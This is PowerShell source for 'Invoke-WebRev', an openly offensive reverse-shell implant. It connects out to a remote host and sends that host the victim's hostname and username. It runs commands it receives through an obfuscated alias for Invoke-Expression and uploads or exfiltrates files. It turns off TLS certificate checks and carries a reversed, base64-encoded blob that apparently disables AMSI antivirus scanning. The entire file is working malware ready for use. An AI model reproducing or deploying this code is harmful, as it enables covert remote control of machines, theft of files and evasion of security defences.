function Invoke-WebRev{
    param
    (
        [string]$ip,
        [string]$port,
        [switch]$ssl
    )

    $help=@"

.SYNOPSIS
    WebRev.
    PowerShell Function: Invoke-WebRev
    Author: Hector de Armas (3v4Si0N)

    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    .

.ARGUMENTS
    -ip   <IP>      Remote Host
    -port <PORT>    Remote Port
    -ssl            Send traffic over ssl

.EXAMPLE
    Invoke-Webrev -ip 192.168.29.131 -port 80
    Invoke-Webrev -ip 192.168.29.131 -port 443 -ssl
"@

    if(-not $ip -or -not $port) { return $help; }
    
    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
    $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
    Invoke-FuckYou;
    $pwd_b64 = getPwd;
    $hname = toBase64 -str "$env:computername";
    $cuser = toBase64 -str "$env:username";

    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
    
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    try { $error[0] = ""; } catch {}

    while ($true)
    {
        try
        {
            $req = Invoke-WebRequest $url -useb -Method POST -Body $json -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
            $header = $req.Headers["Authorization"];
            $c = [System.Convert]::FromBase64String($header);
            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
            $result = "";
            $dataToSend = "";

            if($cstr.split(" ")[0] -eq "upload")
            {
                $type = '"type":"UPL04D"';
                try
                {
                    $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                    if ($cstr.split(" ").Length -eq 3) {
                        $location = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"') {
                        $location = $cstr.split('"') | Select-Object -SkipLast 1 | Select-Object -Last 1;
                    }
                    else {
                        $location = $cstr.split(' ') | Select-Object -Last 1;;
                    }
                    $content = [System.Convert]::FromBase64String($uploadData);
                    $content | Set-Content $location -Encoding Byte
                    $result = '[+] File successfully uploaded.';
                }
                catch {}
            }
            elseif($cstr.split(" ")[0] -eq "download")
            {
                $type = '"type":"D0WNL04D"';
                try
                {
                    if ($cstr.split(" ").Length -eq 3){
                        $cstr = $cstr.Replace('"', '');
                        $pathSrc = $cstr.split(" ")[1];
                        $pathDst = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"'){
                        if ($cstr.split(' ')[1][0] -eq '"') {
                            $pathSrc = $cstr.split('"')[1];
                        } else {
                            $pathSrc = $cstr.split(' ')[1];
                        }
                        $pathDst = $cstr.split('"')[-2];
                    }
                    else{
                        $pathSrc = $cstr.split('"')[1];
                        $pathDst = $cstr.split(' ')[-1];
                    }

                    if (Test-Path -Path $pathSrc) 
                    {
                        $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                        $b64 = [System.Convert]::ToBase64String($downloadData);
                        $result = '[+] File successfully downloaded.", ' + '"file":"' + $b64 + '", ' + '"pathDst":"' + $pathDst;
                    } 
                    else
                    {
                        $type = '"type":"3RR0R"';
                        $result = '[!] Source file not found!';
                    }
                }
                catch {}
            }
            else
            {
                $type = '"type":"C0MM4ND"';                
                $enc = [system.Text.Encoding]::UTF8;
                $new = (taleska-ei-vrixeka $cstr | Out-String);

                $bytes = $enc.GetBytes($new);
                $bytes2 = $enc.GetBytes($result);
                $result = [Convert]::ToBase64String($bytes2 + $bytes);
            }

            if ($cstr.split(" ")[0] -eq "cd") {
                $pwd_b64 = getPwd;
            }
            $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
        }
        catch
        {
            if ($error[0] -ne "")
            {
                try
                {
                    $type = '"type":"3RR0R"';
                    $err = $error[0] | Out-String;
                    $error[0]= "";

                    $bytes = $enc.GetBytes($err);
                    $result = [Convert]::ToBase64String($bytes);
                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}'
                } catch {}
            }
        };
    };
}

function toBase64
{
    Param([String] $str)

    $enc = [system.Text.Encoding]::UTF8;
    $bytes = $enc.GetBytes($str);
    $result = [Convert]::ToBase64String($bytes);
    return $result;
}

function getPwd()
{
    $enc = [system.Text.Encoding]::UTF8;
    $pwd = "pwd | Format-Table -HideTableHeaders";
    $pwd_res = (taleska-ei-vrixeka $pwd | Out-String);
    $bytes = $enc.GetBytes($pwd_res);
    $pwd_b64 = [Convert]::ToBase64String($bytes);
    return $pwd_b64;
}


function Invoke-FuckYou
{
    $b64 = "pYDIsIHZkFEJgwCMgwCajRHUkgSew92Q6oTXsFGazJXYN5yclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5N1WKkibvlGdjVnc0NnbpRCKg0VXbVGd5J0Wg0DIoNGdQRiCpISLigCdpxGcT5ibvlGdjVnc0NnbpRCI9AibvlGdjVnc0NnbpRiCiMzQ4BTLwgDew0yNwgHMtADM4BTL3UDew0COChHMiASPg42bpR3Y1JHdz5WakoAbsVnTtQXdPBCfgkCck0lZlJ3WgwCM0gHMgwSNdJzM05Wa1tFIsIHZkFEJoQ3YlR3byBFbhVHdylmV6oTX19WWrNWdGtlCwASPgAHJKkiIyVmZiAyKgIiZ1JkIgsCIi4WYiAyKgIyYTJCIrAiIpNnIgsCIi0WQiACLsxGJoM3clJHZkF0YvJHU0V2R6oTX19WWrNWdGtFI9AickRWQkoQKiwmIgsCIiwmIgsCIiQmIgsCIi4iIgsCIikmIgsCIiMnIgsCIi0mIgsCIiEmIoknchJnYpxEZh9GT6oTX19WWrNWdGtFI9ACbsRiCKU3bZt2Y1ZEJgUGc5RVLkRWQKoAQioQfKowOpQ3YlR3byBFZs9EbmBHbgQnbpVHI0V3bgwCdjVGdvJHU3VmTsZGI05Wa1BCLlpXaTdHZgIHdQRnbJVFIsM3clJHZkFEcsBic0BFdulEK0NWZ09mcQxWY1RncpZFIs92biBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIKowOpUWbh5GIn5WayR3coknchJnYpxEZh9GTgIHdQRnbJBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIKowOpUWbh50YvJHcgcmbpJHdzBCLlxWdk9WToBic0BFdulEKzNXZyRGZBN2byBFdldEIyRHU05WSg4mclRHelByYpRXY0NHIjlGbiVHcgACIgoQXpIiMzwWZuJXZrJCK0J3bw1WSsxGRbBCIgAiCKsHI19WWrNWdGByczFGbjByYpxmY1BnCKszclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5NFIn5WazVnC70WZ0NXeTByZul2c1pgIABSPgU3bZt2Y1ZEJKoAbsVnbkASPgU3bZt2Y1ZEJ";
    $b64arr = $b64.ToCharArray() ; [array]::Reverse($b64arr) ; -join $b64arr 2>&1> $null;
    $b64str = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$b64arr"));
    taleska-ei-vrixeka $b64str | Out-Null;
}

#Invoke-WebRev -ip 192.168.62.129 -port 4433
